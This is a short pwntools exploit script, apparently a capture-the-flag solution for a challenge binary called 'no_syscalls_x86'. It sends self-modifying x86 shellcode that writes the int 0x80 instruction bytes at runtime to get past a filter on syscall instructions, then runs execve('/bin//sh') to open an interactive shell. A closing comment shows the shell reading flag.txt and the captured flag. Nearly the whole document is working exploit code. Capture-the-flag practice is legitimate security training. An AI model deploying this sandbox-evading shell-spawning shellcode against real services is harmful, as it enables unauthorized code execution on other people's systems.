from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+4)
EXE_FILENAME = '../no_syscalls_x86'

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp)
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

io = start()
io.recvuntil(b'memory).')

io.sendline(asm("""
_start:
    call get_pc

shell:
    .byte 0x90, 0x90
    mov byte ptr [ebx], 0xcd
    mov byte ptr [ebx + 1], 0x80
    xor    ecx, ecx
    push   0xb
    pop    eax
    push   ecx
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    jmp shell
    
get_pc:
    mov  ebx, dword ptr [esp]
    ret
"""))

io.interactive()

'''
$ cat flag.txt
BASC{s4ndb0X1n9_AiNt_3a5y}
'''
